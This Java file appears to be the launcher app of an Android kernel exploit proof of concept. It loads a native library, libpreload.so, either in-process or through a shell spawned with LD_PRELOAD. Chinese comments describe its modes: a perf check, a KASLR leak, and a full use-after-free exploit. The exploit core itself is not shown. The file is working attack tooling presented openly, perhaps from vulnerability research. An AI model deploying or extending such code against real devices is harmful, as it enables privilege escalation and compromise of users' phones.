package com.dchamp.poc;

import android.app.Activity;
import android.content.pm.ApplicationInfo;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Map;

public class MainActivity extends Activity {
    static final String TAG = "DchampApp";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        ApplicationInfo ai = getApplicationInfo();
        String libDir = ai.nativeLibraryDir;
        Log.i(TAG, "uid=" + android.os.Process.myUid()
                + " pid=" + android.os.Process.myPid()
                + " nativeLibraryDir=" + libDir);

        File so = new File(libDir, "libpreload.so");
        Log.i(TAG, "libpreload.so exists=" + so.exists()
                + " canRead=" + so.canRead()
                + " canExecute=" + so.canExecute()
                + " len=" + so.length());

        String mode = getIntent().getStringExtra("mode");
        if (mode == null) {
            mode = "exec";
        }
        Log.i(TAG, "mode=" + mode);

        if (mode.equals("load")) {
            runLoadMode();
        } else if (mode.equals("execfull")) {
            runExecMode(null, null);
        } else if (mode.equals("execslide")) {
            runExecMode(null, "1");
        } else {
            runExecMode("1", null);
        }
    }

    /* 模式 load:在 app 进程内直接 dlopen,constructor 在 zygote 子进程里跑 */
    private void runLoadMode() {
        try {
            Log.i(TAG, "System.loadLibrary(preload) begin");
            System.loadLibrary("preload");
            Log.i(TAG, "System.loadLibrary(preload) returned");
        } catch (Throwable t) {
            Log.e(TAG, "loadLibrary failed", t);
        }
    }

    /* 模式 exec/execslide/execfull:fork+exec /system/bin/sh,LD_PRELOAD 指向 apk 库目录里的 so。
     *   perfOnly  = "1" -> PERF_ONLY=1,只验证 perf 路线
     *   slideOnly = "1" -> SLIDE_ONLY=1,KASLR 泄露成功即停(不进 UAF)
     *   都为 null -> 全量 exploit */
    private void runExecMode(String perfOnly, String slideOnly) {
        ApplicationInfo ai = getApplicationInfo();
        String soPath = new File(ai.nativeLibraryDir, "libpreload.so").getAbsolutePath();
        try {
            ProcessBuilder pb = new ProcessBuilder(
                    "/system/bin/sh", "-c", "echo child-ready pid=$$; sleep 900");
            Map<String, String> env = pb.environment();
            env.put("LD_PRELOAD", soPath);
            if (perfOnly != null) {
                env.put("PERF_ONLY", perfOnly);
            }
            if (slideOnly != null) {
                env.put("SLIDE_ONLY", slideOnly);
            }
            pb.redirectErrorStream(true);
            Process p = pb.start();
            Log.i(TAG, "child started LD_PRELOAD=" + soPath
                    + " PERF_ONLY=" + perfOnly + " SLIDE_ONLY=" + slideOnly);

            final Process proc = p;
            Thread t = new Thread(() -> {
                try {
                    BufferedReader r = new BufferedReader(
                            new InputStreamReader(proc.getInputStream()));
                    String line;
                    while ((line = r.readLine()) != null) {
                        Log.i(TAG, "child| " + line);
                    }
                    Log.i(TAG, "child exited rc=" + proc.waitFor());
                } catch (Exception e) {
                    Log.e(TAG, "child reader: " + e);
                }
            }, "child-out");
            t.setDaemon(true);
            t.start();
        } catch (Exception e) {
            Log.e(TAG, "exec failed", e);
        }
    }
}
